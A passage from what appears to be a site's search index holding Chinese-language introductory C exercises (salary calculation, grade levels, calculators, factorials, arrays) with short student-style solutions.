while(1)\n   {\n      ch = fgetc(fp);\n      if( feof(fp) )\n      {\n          break ;\n      }\n      printf(\"%c\", ch);\n   }\n   rewind(fp);\n   printf(\"\\n\");\n   while(1)\n   {\n      ch = fgetc(fp);\n      if( feof(fp) )\n      {\n          break ;\n      }\n      printf(\"%c\", ch);\n\n   }\n   fclose(fp);\n\n   return(0);\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/","title":"\u671f\u672b\u5fc5\u505a\u9898","text":""},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#1","title":"1","text":"<p>\u8ba1\u7b97\u85aa\u6c34\u603b\u989d</p> <p>\u5df2\u77e5\u67d0\u516c\u53f8\u6709\u4e00\u6279\u9500\u552e\u5458\u5de5\uff0c\u5176\u5e95\u85aa\u4e3a 2000 \u5143\uff0c\u5458\u5de5\u9500\u552e\u989d\u4e0e\u63d0\u6210\u6bd4\u4f8b\u5982\u4e0b\uff1a</p> <ul> <li> <p>\u5f53\u9500\u552e\u989d \u2264 3000 \u65f6\uff0c\u6ca1\u6709\u63d0\u6210\uff1b</p> </li> <li> <p>\u5f53 3000 \uff1c \u9500\u552e\u989d \u2264 7000 \u65f6\uff0c\u63d0\u6210 10%\uff1b</p> </li> <li>\u5f53 7000 \uff1c \u9500\u552e\u989d \u2264 10000 \u65f6\uff0c\u63d0\u6210 15%\uff1b</li> <li>\u5f53\u9500\u552e\u989d \uff1e 10000 \u65f6\uff0c\u63d0\u6210 20%\u3002</li> </ul> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8f93\u5165\u4e00\u4e2a\u6574\u6570\u8868\u793a\u5458\u5de5\u7684\u9500\u552e\u989d\uff0c\u8ba1\u7b97\u51fa\u5176\u85aa\u6c34\u603b\u989d\uff08\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570\u636e\uff09\u5e76\u8f93\u51fa\u3002</p> <p>\u6ce8\u610f\uff1a\u85aa\u6c34= \u5e95\u85aa + \u9500\u552e\u989d * \u63d0\u6210\uff1b\u85aa\u6c34\u603b\u989d\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#11","title":"1.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int a;\n    float b;\n    scanf(\"%d\", &amp;a);\n    if (a &lt;= 3000)\n    {\n        b = 2000;\n        printf(\"%.2f\", b);\n    }\n    else if (a &gt; 3000 &amp;&amp; a &lt;= 7000)\n    {\n        b = 2000 + a * 0.1;\n        printf(\"%.2f\", b);\n    }\n    else if (a &gt; 7000 &amp;&amp; a &lt;= 10000)\n    {\n        b = 2000 + a * 0.15;\n        printf(\"%.2f\", b);\n    }\n    else if (a &gt; 10000)\n    {\n        b = 2000 + a * 0.2;\n        printf(\"%.2f\", b);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#12","title":"1.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    int sales;\n    scanf(\"%d\", &amp;sales);\n    int salary = 2000;\n    float percent;\n    if (sales &lt;= 3000) {\n        percent = 0;\n    } else if (sales &lt;= 7000) {\n        percent = 0.1;\n    } else if (sales &lt;= 10000) {\n        percent = 0.15;\n    } else {\n        percent = 0.2;\n    }\n\n    float income = salary + (sales * percent);\n    printf(\"%0.2f\", income);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#2","title":"2","text":"<p>\u5224\u65ad\u6210\u7ee9\u7684\u7b49\u7ea7</p> <p>\u4ee5\u4e0b\u4e3a\u67d0\u5b66\u6821\u4ee5\u6210\u7ee9\u5212\u5206\u7b49\u7ea7\u7684\u89c4\u5219\uff1a</p> Text Only<pre><code>\u6210\u7ee9\u7b49\u4e8e 100 \u5206\uff0cS\u7ea7\uff1b\n\u6210\u7ee9\u5728 90 ~ 99 \u5206\uff0cA\u7ea7\uff1b\n\u6210\u7ee9\u5728 80 ~ 89 \u5206\uff0cB\u7ea7\uff1b\n\u6210\u7ee9\u5728 70 ~ 79 \u5206\uff0cC\u7ea7\uff1b\n\u6210\u7ee9\u5728 60 ~ 69 \u5206\uff0cD\u7ea7\uff1b\n\u6210\u7ee9\u5728 0 ~ 59 \u5206\uff0cE\u7ea7\uff1b\n</code></pre> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8f93\u5165\u4e00\u4e2a\u6210\u7ee9\uff08\u6574\u6570\uff09\uff0c\u5224\u65ad\u8be5\u6210\u7ee9\u4f4d\u4e8e\u4ec0\u4e48\u7b49\u7ea7\uff0c\u5e76\u5c06\u7b49\u7ea7\u6253\u5370\u8f93\u51fa\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#21","title":"2.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int num;\n    scanf(\"%d\", &amp;num);\n\n    if (num==100) {\n        printf(\"S\");\n    }\n    if (90 &lt;= num &amp;&amp; num &lt;= 99) {\n        printf(\"A\");\n    }\n    if (80 &lt;= num &amp;&amp; num &lt;= 89) {\n        printf(\"B\");\n    }\n    if (70 &lt;= num &amp;&amp; num &lt;= 79) {\n        printf(\"C\");\n    }\n    if (60 &lt;= num &amp;&amp; num &lt;= 69) {\n        printf(\"D\");\n    }\n    if (0 &lt;= num &amp;&amp; num &lt;= 59) {\n        printf(\"E\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#22","title":"2.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    int grade;\n    scanf(\"%d\", &amp;grade);\n    if (grade == 100) {\n        printf(\"S\");\n    } else if (grade &lt;= 99 &amp;&amp; grade &gt;= 90) {\n        printf(\"A\");\n    } else if (grade &lt;= 89 &amp;&amp; grade &gt;= 80) {\n        printf(\"B\");\n    } else if (grade &lt;= 79 &amp;&amp; grade &gt;= 70) {\n        printf(\"C\");\n    } else if (grade &lt;= 69 &amp;&amp; grade &gt;= 60) {\n        printf(\"D\");\n    } else if (grade &lt;= 59 &amp;&amp; grade &gt;= 0) {\n        printf(\"E\");\n    } \n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#3","title":"3","text":"<p>\u8f93\u51fa\u5546\u54c1\u4fe1\u606f</p> <p>\u5df2\u77e5\u56db\u79cd\u5546\u54c1\u7684\u7f16\u53f7\uff0c\u540d\u79f0\u53ca\u5176\u5355\u4ef7\u4e3a\uff1a</p> \u7f16\u53f7 \u540d\u79f0 \u5355\u4ef7 1 \u85af\u7247(crisps) 3.0 \u5143/\u516c\u65a4 2 \u7206\u7c73\u82b1(popcorn) 2.5 \u5143/\u516c\u65a4 3 \u5de7\u514b\u529b(chocolate) 4.0 \u5143/\u516c\u65a4 4 \u53ef\u4e50(cola) 3.5 \u5143/\u4efd <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8f93\u5165\u4e00\u4e2a\u5546\u54c1\u7684\u7f16\u53f7\uff0c\u8f93\u51fa\u5176\u82f1\u6587\u540d\u79f0\u548c\u5355\u4ef7\uff0c\u5f53\u8f93\u5165\u4e0d\u5b58\u5728\u7684\u7f16\u53f7\u65f6\uff0c\u8f93\u51fa<code>none</code>\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#31","title":"3.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int number;\n\n    scanf(\"%d\", &amp;number);\n\n    switch (number) {\n        case 1:\n            printf(\"crisps: \");\n            printf(\"3.0\\n\");\n            break;\n        case 2:\n            printf(\"popcorn: \");\n            printf(\"2.5\\n\");\n            break;\n        case 3:\n            printf(\"chocolate: \");\n            printf(\"4.0\\n\");\n            break;\n        case 4:\n            printf(\"cola: \");\n            printf(\"3.5\\n\");\n            break;\n        default:\n            printf(\"none\\n\");\n            break;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#32","title":"3.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    int number;\n    scanf(\"%d\", &amp;number);\n    if (number == 1) {\n        printf(\"crisps: 3.0\");\n    } else if (number == 2) {\n        printf(\"popcorn: 2.5\");\n    } else if (number == 3) {\n        printf(\"chocolate: 4.0\");\n    } else if (number == 4) {\n        printf(\"cola: 3.5\");\n    } else {\n        printf(\"none\");\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#4","title":"4","text":"<p>\u4efb\u52a1\u63cf\u8ff0</p> <p>\u8bf7\u4f60\u7f16\u5199\u7a0b\u5e8f\uff1a\u73b0\u5728\u8001\u5e08\u60f3\u77e5\u9053\u4e00\u73ed\u7684\u7b49\u7ea7\uff0c\u5373\u7ed9\u51fa\u4e00\u767e\u5206\u5236\u6210\u7ee9\uff0c\u8981\u6c42\u8f93\u51fa\u8be5\u73ed\u6210\u7ee9\u7b49\u7ea7\u2018A\u2019\u3001\u2018B\u2019\u3001\u2018C\u2019\u3001\u2018D\u2019\u3001\u2018E\u2019\u300290 \u5206\u4ee5\u4e0a\u4e3a\u2018A\u2019\uff0c80~89 \u5206\u4e3a\u2018B\u2019\uff0c70~79 \u5206\u4e3a\u2018C\u2019\uff0c60~69 \u5206\u4e3a\u2018D\u2019\uff0c60 \u5206\u4ee5\u4e0b\u4e3a\u2018E\u2019\u3002</p> <p>\u5b9e\u73b0\u601d\u8def</p> <ul> <li>\u4f7f\u7528\u591a\u4e2a <code>if...else...</code> \u8bed\u53e5\u5224\u65ad\u8f93\u5165\u7684\u6210\u7ee9 <code>score</code> \u7b26\u5408\u4e0a\u9762\u7684\u54ea\u79cd\u60c5\u51b5\uff0c\u6839\u636e\u60c5\u51b5\u4e0d\u540c\uff0c\u8ba1\u7b97\u51fa\u4e0d\u540c\u7684\u7ed3\u679c\u3002</li> </ul>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#41","title":"4.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int score;\n\n    scanf(\"%d\", &amp;score);\n\n    if (score &gt;= 90 &amp;&amp; score &lt;= 100) {\n        printf(\"\u6210\u7ee9\u7b49\u7ea7\uff1aA\\n\");\n    } else if (score &gt;= 80 &amp;&amp; score &lt; 90) {\n        printf(\"\u6210\u7ee9\u7b49\u7ea7\uff1aB\\n\");\n    } else if (score &gt;= 70 &amp;&amp; score &lt; 80) {\n        printf(\"\u6210\u7ee9\u7b49\u7ea7\uff1aC\\n\");\n    } else if (score &gt;= 60 &amp;&amp; score &lt; 70) {\n        printf(\"\u6210\u7ee9\u7b49\u7ea7\uff1aD\\n\");\n    } else if (score &gt;= 0 &amp;&amp; score &lt; 60) {\n        printf(\"\u6210\u7ee9\u7b49\u7ea7\uff1aE\\n\");\n    } else {\n        printf(\"\u8bf7\u8f93\u5165\u6709\u6548\u7684\u6210\u7ee9\uff080-100\uff09\u3002\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#42","title":"4.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    double score;\n    char grade;\n    scanf(\"%lf\", &amp;score);\n    while (score &gt; 100 || score &lt; 0) {\n        printf(\"error\\n\");\n        scanf(\"%lf\", &amp;score);\n    }\n    switch ((int)(score / 10)) {\n        case 10:\n        case 9: grade = 'A'; break;\n        case 8: grade = 'B'; break;\n        case 7: grade = 'C'; break;\n        case 6: grade = 'D'; break;\n        case 5:\n        case 4:\n        case 3:\n        case 2:\n        case 1:\n        case 0: grade = 'E';\n    }\n    printf(\"%c\\n\", grade);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#5","title":"5","text":"<p>\u8f93\u51fa\u4e09\u4e2a\u6570\u4e2d\u7684\u6700\u5927\u6570</p> <p>\u6709 3 \u4e2a\u6574\u6570 a\uff0cb\uff0cc\uff0c\u7531\u952e\u76d8\u8f93\u5165\uff0c\u8f93\u51fa\u5176\u4e2d\u6700\u5927\u7684\u6570\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#51","title":"5.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    double weight1, weight2, weight3;\n    scanf(\"%lf %lf %lf\", &amp;weight1, &amp;weight2, &amp;weight3);\n\n    if (weight1 &gt; weight2 &amp;&amp; weight1 &gt; weight3) {\n        printf(\"%.2lf\\n\", weight1);\n    } else if (weight2 &gt; weight1 &amp;&amp; weight2 &gt; weight3) {\n        printf(\"%.2lf\\n\", weight2);\n    } else if (weight3 &gt; weight1 &amp;&amp; weight3 &gt; weight2) {\n        printf(\"%.2lf\\n\", weight3);\n    } else {\n        printf(\"\u65e0\u6cd5\u786e\u5b9a\u6700\u91cd\u7684\u7f8a\uff0c\u53ef\u80fd\u6709\u4e24\u53ea\u6216\u4e09\u53ea\u7f8a\u7684\u4f53\u91cd\u76f8\u540c\u3002\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#52","title":"5.2","text":"C<pre><code>// \u53c2\u8003\u7b54\u6848\u4e00\n#include &lt;stdio.h&gt;\n\nint main()\n{\n    int a, b, c;\n    scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c);\n    if (a &lt; b) {\n        if (b &lt; c) {\n            printf(\"%d\\n\", c);\n        }\n        else {\n            printf(\"%d\\n\", b);\n        }\n    }\n    else if (a &lt; c) {\n        printf(\"%d\\n\", c);\n    }\n    else {\n        printf(\"%d\\n\", a);\n    }\n\n    return 0;\n}\n\n/* \u53c2\u8003\u7b54\u6848\u4e8c\n\n#include &lt;stdio.h&gt;\n\nint main()\n{\n    int a, b, c, temp, max;\n    scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c);\n    temp = (a &gt; b) ? a : b;\n    max = (temp &gt; c) ? temp : c;\n    printf(\"%d\\n\", max);\n    return 0;\n}\n*/\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#6","title":"6","text":"<p>\u5151\u6362\u4eba\u540d\u5e01</p> <p>\u7528 100 \u5143\u4eba\u6c11\u5e01\u5151\u6362 10 \u5143\u30015 \u5143\u548c 1 \u5143\u7684\u7eb8\u5e01\uff08\u6bcf\u4e00\u5f20\u90fd\u8981\u6709\uff09\u5171 50 \u5f20\u3002</p> <p>\u7528\u7a77\u4e3e\u6cd5\u5217\u51fa\u6bcf\u79cd\u65b9\u6848\u5404\u5151\u6362\u591a\u5c11\u5f20\u7eb8\u5e01\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#61","title":"6.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    for (int a = 0; a &lt;= 50; a++) {\n        for (int b = 0; b &lt;= 50; b++) {\n            int c = 50 - a - b;\n            if (c &gt;= 1 &amp;&amp; a * 10 + b * 5 + c == 100) {\n                printf(\"10\u5143: %d, 5\u5143: %d, 1\u5143: %d\\n\", a, b, c);\n            }\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#62","title":"6.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    for (int i = 10; i &lt;= 100; i += 10) {\n        for (int j = 5; j &lt;= 100 - i; j += 5) {\n            int k = 100 - i - j;\n            if ((i / 10 + j / 5 + k) == 50 &amp;&amp; i + j + k == 100) {\n                printf(\"10\u5143: %d, 5\u5143: %d, 1\u5143: %d\\n\", i / 10, j / 5, k);\n            }\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#7","title":"7","text":"<p>\u4efb\u52a1\u63cf\u8ff0</p> <p>\u5c0f\u660e\u60f3\u62e5\u6709\u4e00\u4e2a\u7b80\u6613\u8ba1\u7b97\u5668\u6765\u8ba1\u7b97\u8bfe\u540e\u9898\u56db\u5219\u8fd0\u7b97\uff0c\u8bf7\u4f60\u6765\u7f16\u5199\u7a0b\u5e8f\uff1a\u8f93\u5165\u64cd\u4f5c\u6570\u4e00<code>number1</code>\u3001\u64cd\u4f5c\u7b26<code>operator</code>\u548c\u64cd\u4f5c\u6570\u4e8c<code>number2</code>, \u6c42\u8be5\u8868\u8fbe\u5f0f\u7684\u503c.</p> <p>\u6ce8\u610f: \u9664\u6cd5\u7b97\u5f0f\u8f93\u51fa\u65f6\uff0c\u8f93\u51fa\u6d6e\u70b9\u6570\uff0c\u5176\u4ed6\u7b97\u5f0f\u8f93\u51fa\u6574\u6570\u3002\u82e5\u9664\u6570\u4e3a 0, \u5219\u8f93\u51fa<code>The divsior is 0</code>.</p> <p>\u5b9e\u73b0\u601d\u8def</p> <ul> <li>\u4f7f\u7528\u591a\u4e2a <code>switch...</code> \u8bed\u53e5\u5224\u65ad\u8f93\u5165\u7684\u64cd\u4f5c\u7b26<code>operator</code>,\u7b26\u5408\u4e0a\u9762\u7684\u54ea\u79cd\u60c5\u51b5\uff0c\u6839\u636e\u60c5\u51b5\u4e0d\u540c\uff0c\u8ba1\u7b97\u51fa\u4e0d\u540c\u7684\u7ed3\u679c.</li> </ul>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#71","title":"7.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    double number1, number2;\n    char operator;\n    double result;\n\n    scanf(\"%lf\", &amp;number1);\n    scanf(\" %c\", &amp;operator);\n    scanf(\"%lf\", &amp;number2);\n\n    switch (operator) {\n        case '+':\n            result = number1 + number2;\n            printf(\"%d\\n\", (int)result);\n            break;\n        case '-':\n            result = number1 - number2;\n            printf(\"%d\\n\", (int)result);\n            break;\n        case '*':\n            result = number1 * number2;\n            printf(\"%d\\n\", (int)result);\n            break;\n        case '/':\n            if (number2 == 0) {\n                printf(\"The divsior is 0\\n\");\n            } else {\n                result = number1 / number2;\n                printf(\"%.6lf\\n\", result);\n            }\n            break;\n        default:\n            printf(\"\u65e0\u6548\u7684\u64cd\u4f5c\u7b26\\n\");\n            break;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#72","title":"7.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n  int x, y;\n  char flag;\n  scanf(\"%d %c %d\", &amp;x, &amp;flag, &amp;y);\n  switch (flag)\n  {\n  case '+':\n    printf(\"%d\\n\", x + y);\n    break;\n  case '-':\n    printf(\"%d\\n\", x - y);\n    break;\n  case '*':\n    printf(\"%d\\n\", x * y);\n    break;\n  case '/':\n    if (y == 0)\n    {\n      printf(\"The divsior is 0\");\n      break;\n    }\n    printf(\"%f\\n\", (float)x / (float)y);\n    break;\n  }\n  return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#8","title":"8","text":"<p>\u6253\u5370\u6570\u5b57</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u4ece\u952e\u76d8\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570\uff0c\u7b2c\u4e00\u4e2a\u6b63\u6574\u6570 n \u8868\u793a\u884c\u6570\uff0c\u7b2c\u4e8c\u4e2a\u6b63\u6574\u6570 m \u8868\u793a\u6bcf\u4e00\u884c\u6700\u5927\u7684\u6570\u3002\u8bf7\u7528\u5faa\u73af\u5728\u5c4f\u5e55\u4e0a\u6253\u5370\u4e00\u4e2a n \u884c m \u5217\u7684\u6570\u5b57\u77e9\u5f62\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int a, num;\n    scanf(\"%d\", &amp;a);\n    scanf(\"%d\", &amp;num);\n    for (int i = 1; i &lt;= a; i++)\n    {\n        for (int j = 1; j &lt;= num; j++)\n        {\n            printf(\"%d \", j);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#9","title":"9","text":"<p>\u6253\u5370\u77e9\u5f62</p> <p>\u8bf7\u7528\u7a0b\u5e8f\u5b9e\u73b0\uff1a \u4ece\u952e\u76d8\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570\uff0c\u5206\u522b\u8868\u793a\u884c\u548c\u5217\uff0c\u8bf7\u7528\u5faa\u73af\u5728\u5c4f\u5e55\u4e0a\u6253\u5370\u4e00\u4e2a n \u884c m \u5217\u7684\u661f\u53f7\u77e9\u5f62\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    int n, m;\n    scanf(\"%d %d\", &amp;n, &amp;m);\n    for (int i = 0; i &lt; n; i++) {\n        for (int j = 0; j &lt; m; j++) {\n            printf(\"*\");\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#10","title":"10","text":"<p>\u7edf\u8ba1\u516c\u500d\u6570</p> <p>\u8bf7\u7528\u7a0b\u5e8f\u5b9e\u73b0: \u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570<code>n1, n2</code>\uff0c\u7edf\u8ba1<code>1000(\u542b)</code>\u4ee5\u5185\u6709\u591a\u5c11\u4e2a<code>n1</code>\u548c<code>n2</code>\u7684\u516c\u500d\u6570\uff0c\u5e76\u5c06\u7edf\u8ba1\u7ed3\u679c\u8f93\u51fa\u3002</p> <p>\u8f93\u5165\u683c\u5f0f</p> <p>\u5728\u4e00\u884c\u4e2d\u8f93\u5165\u4e24\u4e2a\u5927\u4e8e 0 \u7684\u6574\u6570\uff0c\u4e2d\u95f4\u7528\u7a7a\u683c\u5206\u9694\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#101","title":"10.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int n1, n2;\n    int sum = 0;\n    scanf(\"%d %d\", &amp;n1, &amp;n2);\n    for (int i = 0; i &lt;= 1000; i++)\n    {\n        if (i % n1 == 0 &amp;&amp; i % n2 == 0)\n        {\n            sum++;\n        }\n    }\n    printf(\"%d\", sum - 1);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#102","title":"10.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n  int n1, n2;\n  scanf(\"%d %d\", &amp;n1, &amp;n2);\n  int i, count = 0;\n  for (i = 1; i &lt;= 1000; i++) {\n    if (i % n1 == 0 &amp;&amp; i % n2 == 0) {\n      count += 1;\n    }\n  }\n  printf(\"%d\", count);\n  return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#11_1","title":"11","text":"<p>\u6c34\u4ed9\u82b1\u6570</p> <p>\u201d\u6c34\u4ed9\u82b1\u6570\u201c\u662f\u6307\u4e00\u4e2a\u4e09\u4f4d\u6570\uff0c\u5176\u5404\u4f4d\u6570\u5b57\u7acb\u65b9\u548c\u7b49\u4e8e\u8be5\u6570\u672c\u8eab\u3002\u4f8b\u5982<code>153 = 1\u00b3 + 5\u00b3 + 3\u00b3</code>\uff0c\u6240\u4ee5<code>153</code>\u662f\u4e00\u4e2a\u6c34\u4ed9\u82b1\u6570\u3002</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u8f93\u5165\u4e00\u4e2a\u4e09\u4f4d\u6570\uff0c\u627e\u51fa<code>100 ~ num(\u542b)</code>\u4e2d\u7684\u6240\u6709\u6c34\u4ed9\u82b1\u6570\uff0c\u5e76\u5c06\u627e\u51fa\u7684\u6c34\u4ed9\u82b1\u6570\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int num;\n    int a, b, c;\n    scanf(\"%d\", &amp;num);\n    for (int i = 100; i &lt;= num; i++) {\n        a = i % 10;\n        b = (i / 10) % 10;\n        c = i / 100;\n        if (a * a * a + b * b * b + c * c * c == i) {\n            printf(\"%d\\n\", i);\n        }\n\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#12_1","title":"12","text":"<p>\u9636\u4e58</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8f93\u5165\u4e00\u4e2a\u6b63\u6574\u6570\uff0c\u8ba1\u7b97\u5e76\u8f93\u51fa\u5b83\u7684\u9636\u4e58\u3002</p> <p>\u6ce8\u610f\uff1a\u7ed3\u679c\u4ee5\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u6570\u636e\u8f93\u51fa\uff0c\u4fdd\u7559 2 \u4f4d\u5c0f\u6570\u3002n!=1\u00d72\u00d73\u00d7\u2026\u00d7n\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#121","title":"12.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int n;\n    scanf(\"%d\", &amp;n);\n    float factorial = 1.0;\n    for (int i = 1; i &lt;= n; i++) {\n        factorial *= i;\n    }\n    printf(\"%.2f\\n\", factorial);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#122","title":"12.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main () {\n    int num;\n    scanf(\"%d\", &amp;num);\n    float sum = 1.0;\n    for (int i = 1; i &lt; num + 1; i++) {\n        sum = sum * i;\n    }\n    printf(\"%.2f\", sum);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#13","title":"13","text":"<p>\u5c06\u6570\u7ec4\u9996\u5c3e\u4e92\u6362\u540e\u8f93\u51fa</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u5c06\u4e00\u4e2a\u6570\u7ec4{11,9,8,2,1,0}\u9996\u5c3e\u4e92\u6362\u540e\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#define N 6\n\nvoid conv(int a[]) {\n    int temp;\n\n    for (int i = 0; i &lt; N / 2; i++) {\n        temp = a[i];\n        a[i] = a[N - i - 1];\n        a[N - i - 1] = temp;\n    }\n}\n\nint main() {\n    int a[N] = { 11,9,8,2,1,0 }, i;\n    conv(a);\n\n    for (i = 0; i &lt; N; i++) {\n        printf(\"%4d\", a[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#14","title":"14","text":"<p>\u6c42\u77e9\u9635\u4e3b\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u6c42\u4e00\u4e2a5*5\u6574\u578b\u77e9\u9635\u4e3b\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#define N 5\n\nint sum(int a[N][N]) {\n    int s = 0;\n    int i;\n\n    for (i = 0; i &lt; N; i++)\n        s = s + a[i][i];\n    return s;\n}\n\nint main() {\n    int a[N][N], s;\n    int i, j;\n\n    printf(\"\u8bf7\u8f93\u5165N*N\u4e2a\u5143\u7d20:\\n\");\n    for (i = 0; i &lt; N; i++) {\n        for (j = 0; j &lt; N; j++)\n            scanf(\"%d\", &amp;a[i][j]);\n    }\n\n    s = sum(a);\n    printf(\"\u4e3b\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c\u4e3a%d\\n\", s);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#15","title":"15","text":"<p>\u7edf\u8ba1\u591a\u884c\u6587\u5b57\u7684\u5b57\u7b26\u4e2a\u6570</p> <p>\u6709\u4e00\u7bc7\u6587\u7ae0\uff0c\u5171\u6709 3 \u884c\u6587\u5b57\uff0c\u6bcf\u884c\u6709 80 